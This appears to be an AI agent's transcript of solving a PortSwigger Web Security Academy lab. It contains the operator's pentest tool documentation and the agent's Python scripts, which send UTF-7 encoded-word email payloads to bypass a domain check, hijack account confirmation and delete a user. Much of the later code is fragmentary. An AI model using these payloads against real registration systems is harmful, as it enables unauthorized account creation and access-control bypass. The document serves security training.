message.content: There is a public bug bounty program / pentest that I need your help with Below are instructions # Context Target URL: https://0a6d00a40439ca7081ebcf04002200d4.web-security-academy.net Lab: Bypassing access controls using email address parsing discrepancies Objective: Lab: Bypassing access controls using email address parsing discrepancies EXPERT This lab validates email addresses to prevent attackers from registering addresses from unauthorized domains. There is a parser discrepancy in the validation logic and library used to parse email addresses. To solve the lab, exploit this flaw to register an account and delete carlos . Required knowledge To solve this lab, you'll need to understand the techniques described in the Splitting the Email Atom: Exploiting Parsers to Bypass Access Controls whitepaper by Gareth Heyes of the PortSwigger Research team. Hint: ACCESS THE LAB Launching labs may take some time, please hold on while we build your environment. Solution Identify the registration restriction Open the lab and click Register . Attempt to register an account with the email foo@exploit-server.net . Notice that the application blocks the request and displays an error message stating that the email domain must be ginandjuice.shop . This indicates the server enforces a domain check during registration. Investigate encoding discrepancies Try to register an account with the following email: =?iso-8859-1?q?=61=62=63?=foo@ginandjuice.shop . This is the email abcfoo@ginandjuice.shop , with the abc portion encoded using Q encoding, which is part of the "encoded-word" standard. Notice that the registration is blocked with the error: "Registration blocked for security reasons." Try to register an account with the following UTF-8 encoded email: =?utf-8?q?=61=62=63?=foo@ginandjuice.shop . Notice that the registration is blocked with the same error message. This suggests that the server is detecting and rejecting attempts to manipulate the registration email with encoded word encoding. It is possible that less common encoding formats may not be picked up by the server's validation. Try to register an account with the following UTF-7 encoded email: =?utf-7?q?&AGEAYgBj-?=foo@ginandjuice.shop . Notice that this attempt doesn't trigger an error. This suggests that the server doesn't recognize UTF-7 encoding as a security threat. Because UTF-7 encoding appears to bypass the server's validation, you may be able to use it to craft an attack that tricks the server into sending a confirmation email to your exploit server email address while appearing to still satisfy the ginandjuice.shop domain requirement. Vulnerability class: business-logic Difficulty: expert This is a PortSwigger Web Security Academy lab. Follow the objective above to exploit the vulnerability and solve the lab. Note: SITEMAP.txt will be mostly empty since this is a fresh target. You should start by exploring the application at the Target URL above to discover endpoints, then proceed with exploitation. When you are finished, write a RETURN.json file to your working directory containing precise information about what you did. Include: - "solved": true/false — whether you believe you solved the lab - "steps": a list of the key actions you took - "evidence": concrete proof of success (e.g. HTTP responses, extracted data, status codes) that demonstrates the exploit worked - "comments": any additional reasoning about why you believe the lab is solved # Starting a Pentest - There are a couple of important files in your working directory that you should interact with when beginning your bug bounty 1. baseline.py => run this script to establish a baseline response for all of the target requests 2. check_roles.py => run this script to see all of the roles available for testing 3. SITEMAP.txt => read this file to see your target requests and their hm_ids, that you should use to annotate your test cases via the @test decorator # Tools Following are some tools for you to use during the bug bounty ## Exploit Session: - Your mode of operation should be generating python scripts - There is a security_test/ in your cwd that contains a set of tools that you should use below. Do not modify this file but understand its public interfaces and use them accordingly - You should follow this rough structure for your scripts: 1. Subclass ExploitSession 2. Implement test methods using the @test decorator. Each test is associated with one or more hm_ids. You can find the url -> hm_id mapping inside SITEMAP.txt 3. Instantiate and call methods directly ## HTTP Client The `self.http` client is a thin wrapper around `httpx.Client` with automatic cookie injection based on user identity. Execute the check_roles.py script to check available users: ```bash python check_roles.py # Output: # Available users for HTTPClientTool: # Use the 'name' field to identify which user's cookies to use. # # name='john_admin' (role type: admin) # name='jane_user' (role type: user) ``` ### Usage Use the `name` parameter to specify which user's session cookies to use: ```python from suite import ExploitSession, test, Phase class IDORTests(ExploitSession): session_id = "idor_test" @test("idor", hm_ids=["HM15"], phase=Phase.EXPLOIT) def test_idor_cross_user(self): # Get admin's resource using john_admin's cookies admin_resp = self.http.get( "https://target.com/api/profile", name="john_admin" ) admin_id = admin_resp.json().get("id") # Try to access admin's resource as regular user (jane_user) user_resp = self.http.get( f"https://target.com/api/profile/{admin_id}", name="jane_user" ) if user_resp.status_code == 200: self.p(f"IDOR FOUND: User accessed admin resource {admin_id}") return True return False t = IDORTests() t.test_idor_cross_user() ``` ## Browser `self.browser` is a headless Chromium instance for tests that require client-side JS execution (XSS, DOM-based vulns, clicking through multi-step flows). The browser launches lazily on first access — no setup needed. ### API | Method | Returns | Description | |---|---|---| | `browser.goto(url)` | `str` (HTML) | Navigate to URL, return page HTML | | `browser.click(selector)` | `str` (HTML) | Click element by CSS selector, return updated HTML | | `browser.type_text(selector, text)` | `None` | Set input value and fire `input` event | | `browser.content()` | `str` (HTML) | Get current page HTML | | `browser.url()` | `str` | Get current page URL | | `browser.evaluate(js)` | `Any` | Execute arbitrary JavaScript, return result | | `browser.screenshot(path)` | `bytes` | Save screenshot to file | ### Usage ```python from suite import ExploitSession, test, Phase class XSSTests(ExploitSession): session_id = "xss_test" @test("reflected-xss", hm_ids=["HM3"], phase=Phase.EXPLOIT) def test_reflected_xss(self): payload = '' url = f"https://target.com/search?q={payload}" self.browser.goto(url) # Check if alert was triggered by evaluating JS result = self.browser.evaluate("document.domain") self.p(f"XSS context domain: {result}") html = self.browser.content() if payload in html: self.p("REFLECTED XSS: payload rendered in DOM") return True return False @test("stored-xss", hm_ids=["HM5"], phase=Phase.EXPLOIT) def test_stored_xss_via_comment(self): # Post malicious comment via HTTP self.http.post("https://target.com/post/comment", data={ "comment": '' }) # Visit the page in a browser to trigger the stored payload html = self.browser.goto("https://target.com/post/2") self.p(f"Page loaded, checking for XSS execution...") return True t = XSSTests() t.test_reflected_xss() ``` The browser has security features disabled (same-origin policy, CSP) so XSS payloads execute without restriction. When you are done with the session, `self.close()` cleans up the browser automatically. ## Interactsh (Out-of-Band) `self.interactsh` is an OOB callback client for SSRF, XXE, blind RCE, and any vuln that requires detecting an external interaction. It registers with a public interactsh server and gives you a unique domain. When the target makes a DNS/HTTP/SMTP request to that domain, you can retrieve it with `poll()`. ### API | Method / Property | Returns | Description | |---|---|---| | `interactsh.domain` | `str` | Unique callback domain (e.g. `abc123...xyz.oast.pro`). Each access generates a fresh subdomain with the same correlation ID. | | `interactsh.correlation_id` | `str` | 20-char ID shared across all generated domains | | `interactsh.poll()` | `list[dict]` | Decrypt and return all pending interactions | | `interactsh.close()` | `None` | Deregister from server | ### Usage ```python from suite import ExploitSession, test, Phase import time class SSRFTests(ExploitSession): session_id = "ssrf_test" @test("ssrf", hm_ids=["HM8"], phase=Phase.EXPLOIT) def test_blind_ssrf(self): callback = self.interactsh.domain self.p(f"OOB callback domain: {callback}") # Inject callback URL into a vulnerable parameter self.http.post("https://target.com/fetch", data={ "url": f"http://{callback}/ssrf-test" }) # Wait for the target to make the request time.sleep(5) hits = self.interactsh.poll() if hits: self.p(f"SSRF CONFIRMED: {len(hits)} OOB interaction(s)") for hit in hits: self.p(f" type={hit.get('protocol')} from={hit.get('remote-address')}") return True self.p("No OOB interactions detected") return False t = SSRFTests() t.test_blind_ssrf() ``` `self.close()` deregisters from the interactsh server automatically. - You are encouraged to modularize your testing as much as possible (unless otherwise stated), by breaking up independent testcases into their own Python scripts ## Exploit Script Comments: - When generating a pentest script, briefly add a comment at the top Examples: ``` """ Test: Check that issued coupon is supcetible to a brute-force attack that attempts to apply it multiple times to the same item Results: CONFIRMED - Issuing ~1000 requests < 1 second to the /coupon/apply?item_id endpoint causes multiple price reductions to be applied """ """ Test: Check that thet tehe 1. Start with victim_vps_id and attacker_vps_id (created from /api/v1/vps/create) 2. /api/v1/network/vpc/metadata -> gets network metadata, including `network_group` from victim_vps and attacker_vps 2. /api/v1/network/vpc/create-subnet -> links network_group together in the same subnet -> [POTENTIAL VULN] check if a temporary association to the subnet is created before approval is granted 3. /api/v1/network/vpc/metadata -> call again to confirm by checking `subnets` field 4. Confirm by pinging victim_vps.subnet_ip Results: PARTIAL - The metadata endpoint indicates that the association is made, but subsequent attempts to actually ping victim_vps.subnet_ip fails """ ``` - The above examples shows different levels of verbosity in the comments; this should vary depending on complexity of attack, novelty, and other factors that I leave in your judgement - Its goal is both informational and also to force you to articulate a structured thesis for a test script before embarking on its creation # Ending a Pentest ## Token Limit and Session Termination - At some point you will receive a warning message saying that you are out of tokens - When this happens, execute the following concluding actions: > If any write commands (ie. writing to file, editing file) were interrupted before they could finish, restart and finish them > Generate a summary of your work and put it into SUMMARY.txt ## Return and Errors - When finished create a RETURN.json with format: ``` { "status": SUCCESS | FAIL | PARTIAL "comment": "" } ``` - SUCCESS: if testing went smoothly with APIs being responsive - ERROR: if APIs were unresponsive ie. 401s unauthorized - PARTIAL: if encountered headwinds that partially blocked/mitigated testing efforts ie. aggresive 429s, APIs suddenly unresponsive - Only comment if ERROR | PARTIAL # Steps 1. Execute the steps from `Starting a Pentest` in order 2. Then continue iterating on pentest scripts using method defined in `Tools`. It is **important** that you continue until the condition laid out in `Ending a Pentest`. DO NOT stop before 3. Upon completion, summarize your progress in SUMMARY.txt. If you've received a TOKEN LIMIT reached message, then mention that in the SUMMARY.txt After you are finished the task above, print a "IAMDONE" message. Do not add anything to the message except this string.

from __future__ import annotations

import json
import uuid
import logging
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional
from dataclasses import dataclass, field
from enum import Enum, auto

from src.common.sitemap import SiteMap

from .http_tool import HTTPClientTool, UserRole, ToolConfig

# REFACTOR: might be good to have a separate Tools factory
# @dataclass
# class Tools:
#     http: HTTPClientTool
#     p: Callable[[Any], None] = field(default=print)


class Phase(Enum):
    VALIDATE = auto()
    EXPLOIT = auto()
    PROBE = auto()


@dataclass
class TestMeta:
    vuln_class: str
    hm_ids: List[str] = field(default_factory=list)
    phase: Phase = Phase.VALIDATE
    severity: str = "medium"
    cve: Optional[str] = None
    tags: List[str] = field(default_factory=list)


def test(
    vuln_class: str,
    *,
    hm_ids: List[str] = None,
    phase: Phase = Phase.VALIDATE,
    severity: str = "medium",
    cve: str = None,
    tags: List[str] = None
):
    """Decorator that marks a method as a security test case."""
    def decorator(fn: Callable) -> Callable:
        fn._test_meta = TestMeta(
            vuln_class=vuln_class,
            hm_ids=hm_ids or [],
            phase=phase,
            severity=severity,
            cve=cve,
            tags=tags or []
        )
        return fn
    return decorator


class ExploitSession:
    session_id: str = "unnamed"
    config_file: str = "tool_config.json"
    proxy: Optional[str] = None
    user_roles: Optional[List[UserRole]] = None
    TEST_OBSERVATIONS: str = ""

    def __init__(
        self,
        session_id: str = None,
        config_file: str = None,
        proxy: str = None,
        user_roles: List[UserRole] = None,
    ):
        self.session_id = session_id or self.__class__.session_id or uuid.uuid4().hex[:8]
        self.config_file = config_file or self.__class__.config_file

        # Load tool config which contains paths to sitemap and user_roles
        self._tool_config = ToolConfig.from_file(self.config_file)

        # Proxy priority: explicit parameter > config file > class default
        self.proxy = proxy or self._tool_config.proxy or self.__class__.proxy

        # Load user_roles from file if not provided directly
        if user_roles is not None:
            self.user_roles = user_roles
        elif self.__class__.user_roles is not None:
            self.user_roles = self.__class__.user_roles
        else:
            self.user_roles = self._load_user_roles()

        self._http: Optional[HTTPClientTool] = None
        self._sitemap: Optional[SiteMap] = None
        self._browser = None
        self._interactsh = None
        self._logger = self._setup_logger()

    def _load_user_roles(self) -> Optional[List[UserRole]]:
        """Load user roles from the configured user_roles_file."""
        roles = self._tool_config.load_user_roles()
        return roles if roles else None
    
    def _setup_logger(self) -> logging.Logger:
        """Setup file logger based on config."""
        logger = logging.getLogger(f"ExploitSession.{self.session_id}")
        logger.setLevel(logging.INFO)

        # Remove existing handlers to avoid duplicates
        logger.handlers.clear()

        log_path = self._resolve_log_path()

        # Create file handler
        file_handler = logging.FileHandler(log_path, mode="a", encoding="utf-8")
        file_handler.setLevel(logging.INFO)

        # Create formatter
        formatter = logging.Formatter(
            "%(asctime)s - %(name)s - %(levelname)s - %(message)s",
            datefmt="%Y-%m-%d %H:%M:%S"
        )
        file_handler.setFormatter(formatter)

        logger.addHandler(file_handler)
        logger.propagate = False

        return logger

    def _resolve_log_path(self) -> Path:
        """Resolve the log file path from config, supporting file or directory inputs."""
        log_path = Path(self._tool_config.logfilepath)
        if not log_path.is_absolute():
            log_path = Path.cwd() / log_path

        if log_path.suffix:
            log_path.parent.mkdir(parents=True, exist_ok=True)
            return log_path

        log_path.mkdir(parents=True, exist_ok=True)
        return log_path / "pentest.log"

    def _load_sitemap(self) -> SiteMap:
        path = Path(self._tool_config.sitemap_file)
        if not path.exists():
            return SiteMap.from_json([])
        try:
            with path.open("r", encoding="utf-8") as f:
                data = json.load(f)
            return SiteMap.from_json(data) if isinstance(data, list) else SiteMap.from_json([])
        except Exception:
            return SiteMap.from_json([])
    
    @property
    def sitemap(self) -> SiteMap:
        if self._sitemap is None:
            self._sitemap = self._load_sitemap()
        return self._sitemap
    
    @property
    def browser(self) -> "BrowserTool":
        if self._browser is None:
            from .browser_tool import BrowserTool
            self._browser = BrowserTool()
            self._browser.start()
        return self._browser

    @property
    def interactsh(self) -> "InteractshClient":
        if self._interactsh is None:
            from .interactsh_tool import InteractshClient

"""
Sync browser tool for pentest agents.

Wraps BrowserContextManager + BrowserSession behind a simple synchronous API.
All async operations are dispatched to a dedicated background event loop to avoid
nested-loop issues when called from sync agent code.
"""

from __future__ import annotations

import asyncio
import threading
from typing import Any, Optional


class BrowserTool:
    """Synchronous browser for pentest scripts.

    Usage::

        browser = BrowserTool()
        browser.start()
        html = browser.goto("https://target.com/login")
        browser.evaluate("document.querySelector('#user').value = 'admin'")
        browser.click("#login-btn")
        browser.close()

    Or as a context manager::

        with BrowserTool() as browser:
            browser.goto("https://target.com")
    """

    def __init__(self, headless: bool = True, disable_security: bool = True):
        self._headless = headless
        self._disable_security = disable_security
        self._ctx_manager = None
        self._session = None
        self._loop: Optional[asyncio.AbstractEventLoop] = None
        self._thread: Optional[threading.Thread] = None

    # ------------------------------------------------------------------
    # Background event loop
    # ------------------------------------------------------------------

    def _ensure_loop(self) -> asyncio.AbstractEventLoop:
        if self._loop is not None and self._loop.is_running():
            return self._loop
        self._loop = asyncio.new_event_loop()
        self._thread = threading.Thread(target=self._loop.run_forever, daemon=True)
        self._thread.start()
        return self._loop

    def _run(self, coro) -> Any:
        """Submit *coro* to the background loop and block until done."""
        loop = self._ensure_loop()
        future = asyncio.run_coroutine_threadsafe(coro, loop)
        return future.result()

    # ------------------------------------------------------------------
    # Lifecycle
    # ------------------------------------------------------------------

    def start(self) -> "BrowserTool":
        """Launch the browser and acquire a session."""
        from discovery.browser_context import BrowserContextManager

        self._ctx_manager = BrowserContextManager(
            headless=self._headless,
            disable_security=self._disable_security,
        )
        browser_data = self._run(self._ctx_manager.__aenter__())
        self._session = browser_data.session
        return self

    def close(self) -> None:
        """Kill the browser and release resources."""
        if self._ctx_manager is not None:
            try:
                self._run(self._ctx_manager.__aexit__(None, None, None))
            except Exception:
                pass
            self._ctx_manager = None
            self._session = None

        if self._loop is not None and self._loop.is_running():
            self._loop.call_soon_threadsafe(self._loop.stop)
            if self._thread is not None:
                self._thread.join(timeout=5)
            self._loop.close()
            self._loop = None
            self._thread = None

    # ------------------------------------------------------------------
    # Navigation
    # ------------------------------------------------------------------

    def goto(self, url: str) -> str:
        """Navigate to *url* and return the page HTML."""
        self._require_session()
        self._run(self._session.navigate_to(url))
        return self.content()

    def url(self) -> str:
        """Return the current page URL."""
        self._require_session()
        return self._run(self._session.get_current_page_url())

    # ------------------------------------------------------------------
    # DOM interaction
    # ------------------------------------------------------------------

    def content(self) -> str:
        """Return the full page HTML."""
        self._require_session()
        return self.evaluate("document.documentElement.outerHTML") or ""

    def click(self, selector: str) -> str:
        """Click the element matching *selector* and return updated HTML."""
        self._require_session()
        js = f"document.querySelector({selector!r})?.click()"
        self.evaluate(js)
        return self.content()

    def type_text(self, selector: str, text: str) -> None:
        """Set the value of an input element matching *selector*."""
        self._require_session()
        js = (
            f"(function() {{"
            f"  var el = document.querySelector({selector!r});"
            f"  if (el) {{ el.value = {text!r}; el.dispatchEvent(new Event('input', {{bubbles:true}})); }}"
            f"}})()"
        )
        self.evaluate(js)

    def evaluate(self, js: str) -> Any:
        """Execute arbitrary JavaScript and return the result."""
        self._require_session()
        return self._run(self._evaluate_async(js))

    async def _evaluate_async(self, js: str) -> Any:
        cdp_session = await self._session.get_or_create_cdp_session()
        result = await cdp_session.cdp_client.send.Runtime.evaluate(
            params={"expression": js, "returnByValue": True},
            session_id=cdp_session.session_id,
        )
        if result and "result" in result and "value" in result["result"]:
            return result["result"]["value"]
        return None

    # ------------------------------------------------------------------
    # Screenshot
    # ------------------------------------------------------------------

    def screenshot(self, path: str) -> bytes:
        """Capture a screenshot, save to *path*, and return raw bytes."""
        self._require_session()
        return self._run(self._session.take_screenshot(path=path))

    # ------------------------------------------------------------------
    # Context-manager support
    # ------------------------------------------------------------------

    def __enter__(self) -> "BrowserTool":
        self.start()
        return self

    def __exit__(self, *exc) -> None:
        self.close()

    # ------------------------------------------------------------------
    # Internal
    # ------------------------------------------------------------------

    def _require_session(self) -> None:
        if self._session is None:
            raise RuntimeError("Browser not started. Call .start() first.")

"""
Test: Exploit email address parsing discrepancy to bypass domain restriction.

The lab enforces that registration emails must be @ginandjuice.shop.
UTF-7 encoded-word encoding bypasses the server's validation while the
underlying mail library decodes the email to our exploit server address.

Attack chain:
1. Craft a UTF-7 encoded email that passes domain validation (appears as @ginandjuice.shop)
   but when decoded by the mail library, sends to our exploit server
2. Register with this crafted email
3. Get confirmation link from exploit server email client
4. Confirm account, login, and delete carlos

The key insight from the whitepaper: encoded-word syntax allows embedding
a different actual email address. The server validates the raw string but
the mail library decodes encoded-word before sending.
"""
from suite import ExploitSession, test, Phase
import re
import time

TARGET = "https://0a6d00a40439ca7081ebcf04002200d4.web-security-academy.net"
EXPLOIT_SERVER = "https://exploit-0aa500cb0458ca4381e8ce1201d40007.exploit-server.net"
EMAIL_CLIENT = f"{EXPLOIT_SERVER}/email"

class EmailParsingExploit(ExploitSession):
    session_id = "email_parsing"

    def get_csrf(self, url):
        """Fetch a page and extract the CSRF token."""
        resp = self.http.get(url)
        match = re.search(r'name="csrf"\s+value="([^"]+)"', resp.text)

"""
Test: Check exploit server email client for registration confirmation emails,
and try refined UTF-7 encoded-word payloads to redirect confirmation emails.

The mail library may decode the encoded-word and use the result as the actual
email address. If we encode "attacker@exploit-server.net" in UTF-7 and append
@ginandjuice.shop, the validator sees @ginandjuice.shop but the mail library
decodes the encoded-word to get attacker@exploit-server.net.
"""
from suite import ExploitSession, test, Phase
import re
import time

TARGET = "https://0a6d00a40439ca7081ebcf04002200d4.web-security-academy.net"
EXPLOIT_SERVER = "https://exploit-0aa500cb0458ca4381e8ce1201d40007.exploit-server.net"
EXPLOIT_DOMAIN = "exploit-0aa500cb0458ca4381e8ce1201d40007.exploit-server.net"
EMAIL_CLIENT = f"{EXPLOIT_SERVER}/email"

class EmailExploit(ExploitSession):
    session_id = "email_exploit"

    def get_csrf(self, url):
        resp = self.http.get(url)
        match = re.search(r'name="csrf"\s+value="([^"]+)"', resp.text)
        if not match:
            match = re.search(r'value="([^"]+)"\s*name="csrf"', resp.text)
        if match:
            return match.group(1), resp
        return None, resp

    def extract_messages(self, html):
        messages = []
        if "Only emails with the ginandjuice.shop domain" in html:
            messages.append("BLOCKED: domain restriction")
        if "Registration blocked for security reasons" in html:
            messages.append("BLOCKED: security reasons")
        if "Invalid email" in html:
            messages.append("BLOCKED: invalid email")
        if "Please check your emails" in html:
            messages.append("SUCCESS: check email")
        if "Account registration successful" in html:
            messages.append("SUCCESS: registered")
        return messages

    def register(self, username, email, label=""):
        csrf, _ = self.get_csrf(f"{TARGET}/register")
        resp = self.http.post(f"{TARGET}/register", data={
            "csrf": csrf,
            "username": username,
            "email": email,
            "password": "password123"
        })
        msgs = self.extract_messages(resp.text)
        self.p(f"[{label}] Email: {email}")
        self.p(f"  Messages: {msgs}")
        return resp, msgs

    @test("business-logic", hm_ids=[], phase=Phase.EXPLOIT)
    def check_email_client(self):
        """Check exploit server email client for any received emails"""
        resp = self.http.get(EMAIL_CLIENT)
        self.p(f"Email client status: {resp.status_code}")
        self.p(f"Email client content (first 3000 chars):\n{resp.text[:3000]}")
        return True

    @test("business-logic", hm_ids=[], phase=Phase.EXPLOIT)
    def try_utf7_variants(self):
        """
        Try various UTF-7 encoded-word formats to redirect email.

        The key: the encoded-word must contain the exploit server email address
        encoded in UTF-7 so that when the mail library decodes it, it sends the
        email to our exploit server.

        In UTF-7:
        - @ becomes +AEA-
        - . stays as .
        - - stays as -
        - Most ASCII is direct

        The full email address in UTF-7 Q-encoding:
        attacker+AEA-exploit-server.net
        """

        # Approach: We encode our exploit email in UTF-7 Q-encoding
        # and append @ginandjuice.shop so the validator passes it

        # Variant 1: Already tested - full exploit email in Q-encoding
        # =?utf-7?q?attacker+AEA-exploit-server.net?=@ginandjuice.shop
        # This passed! But did the email go to our server?

        # Variant 2: Use the encoded-word with a CRLF or folding whitespace
        # to separate the encoded portion from the @ginandjuice.shop

        # Variant 3: Try different local parts
        exploit_email_local = f"attacker+AEA-{EXPLOIT_DOMAIN}"

        # Use Q-encoding
        email_v1 = f"=?utf-7?q?{exploit_email_local}?=@ginandjuice.shop"
        resp, msgs = self.register("attack1", email_v1, "V1: Full Q-encoded exploit")

        # Variant 4: Try with spaces/folding
        email_v2 = f"=?utf-7?q?{exploit_email_local}?= @ginandjuice.shop"
        resp, msgs = self.register("attack2", email_v2, "V2: Space before @GJ")

        # Variant 5: Try double encoded-word (adjacent encoded-words fold together)
        email_v3 = f"=?utf-7?q?{exploit_email_local}?= =?utf-7?q??=@ginandjuice.shop"
        resp, msgs = self.register("attack3", email_v3, "V3: Double encoded-word")

        # Variant 6: Use only the domain in encoded-word
        # Encode just the exploit domain in UTF-7
        email_v4 = f"attacker@=?utf-7?q?{EXPLOIT_DOMAIN}?=@ginandjuice.shop"
        resp, msgs = self.register("attack4", email_v4, "V4: Encoded domain only")

        # Variant 7: Encode @ as part of a non-ASCII character in UTF-7
        # In UTF-7, non-ASCII chars are encoded with + and base64
        # For example, encoding a unicode char that contains @
        email_v5 = f"=?utf-7?q?a]@{EXPLOIT_DOMAIN}?=@ginandjuice.shop"
        resp, msgs = self.register("attack5", email_v5, "V5: literal @ in encoded-word")

        return True

    @test("business-logic", hm_ids=[], phase=Phase.EXPLOIT)
    def check_email_after(self):
        """Check exploit server email client after registration attempts"""
        time.sleep(2)
        resp = self.http.get(EMAIL_CLIENT)
        self.p(f"Email client status: {resp.status_code}")
        self.p(f"Email client content (first 5000 chars):\n{resp.text[:5000]}")
        return True

t.check_email_client()
print("\n" + "="*80 + "\n")
t.try_utf7_variants()
print("\n" + "="*80 + "\n")
t.check_email_after()
t.close()

We need the mail library to decode:

and see:
  attacker@exploit-server.net@ginandjuice.shop

But the challenge is that the validator probably also sees this after decoding
and blocks it. So we need to try different approaches where the validator and
mail library disagree.

From the whitepaper - key techniques:
1. Encoded-word in local part with encoded @ that creates a second email
2. Using special characters like () for comments that get stripped
3. Using <> angle brackets in encoded-word

Let me try various combinations.

import base64

        self.register(f"adv{n}", email, "Double @ in UTF-7")

        self.register(f"adv{n}", email, "Encoded-word in quoted local")

        return True

"""

the email to a different address.

just to ginandjuice.shop instead of our exploit server.

New approach: Maybe the mail library expects the To: header to have
a specific format, and we need to encode the ENTIRE address (including @domain)
in a way that bypasses the domain check but routes to our server.

From the whitepaper - Jython's email address parsing:
- Some parsers extract the first addr-spec found in the header
- Some parsers look for angle brackets
- Some parsers handle encoded-words before extracting the address

take the first @ as the domain separator (getting our exploit domain),

EXPLOIT_DOMAIN = "exploit-0aa500cb0458ca4381e8ce1201d40007.exploit-server.net"
EMAIL_CLIENT = f"{EXPLOIT_SERVER}/email"

    return prefix + ''.join(random.choices(string.ascii_lowercase, k=8))

    session_id = "exploit_v7"

    def get_csrf(self, url):

        if match:
            return match.group(1), resp
        return None, resp

            "csrf": csrf,
            "username": username,
            "email": email,
            "password": "password123"
        })
        html = resp.text
        if "Only emails with the ginandjuice.shop domain" in html:
            result = "BLOCKED: domain"
        elif "Registration blocked for security reasons" in html:
            result = "BLOCKED: security"
        elif "Invalid email" in html:
            result = "BLOCKED: invalid"
        elif "Please check your emails" in html:
            result = "PASSED"
        elif "already" in html.lower():
            result = "BLOCKED: exists"
        else:
            result = "UNKNOWN"
        self.p(f"[{label}] {result}")
        return result

        resp = self.http.get(EMAIL_CLIENT)
        html = resp.text
        if "Inbox is empty" not in html:

            self.p(html)
            return html
        return None

        that's a subdomain of exploit-server.net and should appear in our inbox!

        that changes the domain. If the mail library sees:
        a@ginandjuice.shop.exploit-server.net
        then it routes to ginandjuice.shop.exploit-server.net (subdomain of our server)

        to be ginandjuice.shop.exploit-server.net.

        =?utf-7?q?a?=@ginandjuice.shop=?utf-7?q?.exploit-server.net?=
        Hmm, this probably won't work since we can't put encoded-words in the domain.

        OR: put the ENTIRE address in the encoded-word:
        =?utf-7?q?a+AEA-ginandjuice.shop.exploit-server.net?=@ginandjuice.shop
        Decoded: a@ginandjuice.shop.exploit-server.net@ginandjuice.shop

        If the mail library takes the FIRST @ for domain extraction:
        -> domain is ginandjuice.shop.exploit-server.net (OUR subdomain!)
        If it takes the LAST @:
        -> domain is ginandjuice.shop (not useful)
        """

        result = self.register(uname, email, "Encoded-word in domain")

        time.sleep(3)
        self.check_inbox()

    def try_single_encoded_word_full_address(self):
        """

        with NO trailing @ginandjuice.shop?

        The validator needs to see @ginandjuice.shop... so we encode ginandjuice.shop
        as part of the UTF-7 encoded-word but make the actual address be to our server.

        =?utf-7?q?a+AEA-{EXPLOIT_DOMAIN}+AEA-ginandjuice.shop?=
        Q-decoded: a+AEA-exploit.net+AEA-ginandjuice.shop
        UTF-7 decoded: a@exploit.net@ginandjuice.shop

        Hmm, but this was already tried. The email goes through but inbox is empty.

        Unless... the mail library actually sends to this bizarre address and
        ginandjuice.shop rejects it? Or the mail system just doesn't work with
        double-@ addresses?

        Let me try a COMPLETELY different approach:
        What if the encoded-word contains the exploit email, and we use
        a newline/folding to separate it from @ginandjuice.shop?

        In MIME headers, long lines can be folded with CRLF+space.
        If we get the mail library to fold the header:
        To: decoded-exploit-email\r\n @ginandjuice.shop
        The mail library might treat the first line as the address.
        """

        # Let's try encoded-word containing just the exploit server email
        # WITHOUT any @ginandjuice.shop after it
        uname = randu("full")
        email = f"=?utf-7?q?a+AEA-{EXPLOIT_DOMAIN}?="
        result = self.register(uname, email, "Full address in EW only")
        # This will probably fail domain check since there's no @ginandjuice.shop

        # What about encoding @ginandjuice.shop in UTF-7 too?
        # =?utf-7?q?a+AEA-exploit.net?==?utf-7?q?+AEA-ginandjuice.shop?=
        # Two adjacent encoded-words: RFC 2047 says they're joined after decoding
        # Decoded: a@exploit.net + @ginandjuice.shop = a@exploit.net@ginandjuice.shop
        uname = randu("full")
        email = f"=?utf-7?q?a+AEA-{EXPLOIT_DOMAIN}?==?utf-7?q?+AEA-ginandjuice.shop?="
        result = self.register(uname, email, "Two adjacent encoded-words")

        # What if we put everything in a single encoded-word including ginandjuice.shop?
        # and add a NULL between the exploit email and ginandjuice.shop
        uname = randu("full")
        email = f"=?utf-7?q?a+AEA-{EXPLOIT_DOMAIN}+AAA-ginandjuice.shop?="
        result = self.register(uname, email, "NUL separator no trailing @")

        time.sleep(5)
        self.check_inbox()
        return True

## Key Solution Details

The server doesn't recognize UTF-7 encoding as a security threat, and UTF-7 encoding appears to bypass the server's validation, allowing you to craft an attack that tricks the server into sending a confirmation email to your exploit server email address while appearing to still satisfy the ginandjuice.shop domain requirement.

## How It Works

The encoded email address passes validation due to the @ginandjuice.shop portion at the end, but the email server interprets the registration email as attacker@[YOUR-EXPLOIT-SERVER-ID].

## Background

The vulnerability exists because email parsing libraries like the Ruby Gem "Mail" (which has over 508 million downloads) decode UTF-7. The attack uses encoding tricks from RFC 2822, 2047, and UTF-7, combined with real-world email parsing bugs, to bypass access controls.

- &AEA- decodes to @ (U+0040)
- &ACA- decodes to space (U+0020)

import time
import random

    return prefix + ''.join(random.choices(string.ascii_lowercase, k=6))

    session_id = "exploit_v8"

        resp = self.http.get(url)

        return None, resp

        html = resp.text
        if "Only emails with the ginandjuice.shop domain" in html:

        elif "Registration blocked for security reasons" in html:
            result = "BLOCKED: security"
        elif "Invalid email" in html:
            result = "BLOCKED: invalid"
        elif "Please check your emails" in html:
            result = "PASSED"
        elif "already" in html.lower():
            result = "BLOCKED: exists"
        else:

            inbox = self.check_inbox()
            if inbox:

            self.p("Waiting longer...")
            time.sleep(5)
            inbox = self.check_inbox()
            if inbox:

        email = f"=?utf-7?q?attacker&AEA-{EXPLOIT_DOMAIN}?=@ginandjuice.shop"

Status: SOLVED

## Vulnerability
Business logic flaw in email domain validation. The application restricts registration to @ginandjuice.shop emails, but there is a parser discrepancy between the domain validator and the underlying mail library.

## Exploit
The validator checks the raw email string for @ginandjuice.shop, but the mail library decodes RFC 2047 encoded-words (specifically UTF-7/IMAP modified UTF-7) before determining the delivery address.

Payload: =?utf-7?q?attacker&AEA-exploit-server.net&ACA-?=@ginandjuice.shop

Where:
- &AEA- decodes to @ in IMAP modified UTF-7
- &ACA- decodes to space
- The validator sees @ginandjuice.shop at the end (passes domain check)
- The mail library decodes to "attacker@exploit-server.net " and routes the email there
- ISO-8859-1 and UTF-8 encoded-words are detected and blocked, but UTF-7 is not

- UTF-8 encoded-word: blocked with "Registration blocked for security reasons"
- UTF-7 encoded-word: PASSES validation (no security check for UTF-7)
- Standard UTF-7 (+AEA- for @): passes validation but doesn't redirect email delivery
- IMAP modified UTF-7 (&AEA- for @): passes validation AND redirects email to attacker domain

- exploit.py-exploit7.py: Progressive exploitation attempts

- solve5.py: Complete end-to-end exploit (register -> confirm -> login -> admin -> delete)
